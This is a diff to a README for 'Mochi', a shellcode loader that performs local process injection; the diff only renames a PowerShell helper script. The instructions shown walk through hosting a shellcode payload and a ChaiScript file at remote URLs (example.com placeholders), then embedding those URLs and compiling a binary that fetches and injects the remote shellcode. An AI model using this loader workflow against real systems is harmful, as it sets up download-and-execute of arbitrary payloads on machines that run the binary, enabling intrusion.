@@ -53,13 +53,13 @@ The Mochi loader implements local process injection of a shellcode payload. This
 2. Upload the shellcode payload binary file to a remote hosting location, such as an S3 bucket. Obtain the URL and note it down.
 3. Execute the following PowerShell helper script with your shellcode payload URL:
 ```
-.\helper_scripts\init_chaiscript_inject_module.ps1 -payloadUrl "https://example.com/shellcode.bin"
+.\helper_scripts\chaiscript_inject_module_init.ps1 -payloadUrl "https://example.com/shellcode.bin"
 ```
 4. At this point, the `inject.chai` file at the `Mochi\scripts\` path will be populated with your shellcode payload URL and be ready to execute.
 5. Upload the `inject.chai` file to a remote hosting location, such as an S3 bucket. Obtain the URL and note it down.
 6. Execute the following PowerShell helper script with your ChaiScript file URL:
 ```
-.\helper_scripts\init_chaiscript_inject_module.ps1 -scriptUrl "https://example.com/inject.chai"
+.\helper_scripts\chaiscript_inject_module_init.ps1 -scriptUrl "https://example.com/inject.chai"
 ```
 7. At this point, the `Mochi.cpp` file at the `Mochi\` path will be populated with your ChaiScript file URL and be ready for compilation.
 8. Compile Mochi in the Visual Studio project and execute binary to validate successful initialization.
